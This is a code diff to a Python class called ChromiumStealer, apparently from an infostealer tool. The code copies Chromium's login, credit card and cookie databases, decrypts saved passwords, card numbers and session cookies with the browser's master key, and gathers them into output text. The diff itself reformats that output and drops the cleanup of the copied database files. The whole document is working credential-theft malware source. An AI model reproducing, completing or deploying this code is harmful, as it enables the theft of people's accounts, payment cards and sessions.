@@ -38,6 +38,7 @@ import shutil
 from datetime import datetime
 
 from config.manager import ModuleManager
+from config.constants import Constant
 class ChromiumStealer(ModuleManager):
     
     def __init__(self) -> None:
@@ -67,12 +68,12 @@ class ChromiumStealer(ModuleManager):
         if not os.path.exists(path):
             return
 
-        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
-            return
-
         with open(path + "\\Local State", "r", encoding="utf-8") as f:
             c = f.read()
-        local_state = json.loads(c)
+            if 'os_crypt' not in c:
+                return
+            
+            local_state = json.loads(c)
 
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
@@ -111,13 +112,10 @@ class ChromiumStealer(ModuleManager):
         cursor.execute('SELECT action_url, username_value, password_value FROM logins')
         for row in cursor.fetchall():
             password = self.decrypt_password(row[2], master_key)
-            result += f"""
-            URL: {row[0]}
-            Email: {row[1]}
-            Password: {password}
-            """
+            result += f"""\nURL: {row[0]}\nEmail: {row[1]}\nPassword: {password}"""
+            result += Constant.seperator
+            
         conn.close()
-        os.remove('login_db')
         return result
 
 
@@ -125,27 +123,20 @@ class ChromiumStealer(ModuleManager):
         cards_db = f'{path}\\{profile}\\Web Data'
         if not os.path.exists(cards_db):
             return
-
         result = ""
         shutil.copy(cards_db, 'cards_db')
         conn = sqlite3.connect('cards_db')
         cursor = conn.cursor()
-        cursor.execute(
-            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2] or not row[3]:
                 continue
-
+            
             card_number = self.decrypt_password(row[3], master_key)
-            result += f"""
-            Name On Card: {row[0]}
-            Card Number: {card_number}
-            Expires On:  {row[1]} / {row[2]}
-            Added On: {datetime.fromtimestamp(row[4])}
-            """
-
+            result += f"""\nName On Card: {row[0]}\nCard Number: {card_number}\nExpires On:  {row[1]} / {row[2]}\nAdded On: {datetime.fromtimestamp(row[4])}"""
+            result += Constant.seperator
+            
         conn.close()
-        os.remove('cards_db')
         return result
 
 
@@ -163,17 +154,10 @@ class ChromiumStealer(ModuleManager):
                 continue
 
             cookie = self.decrypt_password(row[3], master_key)
-
-            result += f"""
-            Host Key : {row[0]}
-            Cookie Name : {row[1]}
-            Path: {row[2]}
-            Cookie: {cookie}
-            Expires On: {row[4]}
-            """
+            result += f"""\nHost Key : {row[0]}\nCookie Name : {row[1]}\nPath: {row[2]}\nCookie: {cookie}\nExpires On: {row[4]}"""
+            result += Constant.seperator
 
         conn.close()
-        os.remove('cookie_db')
         return result
 
 
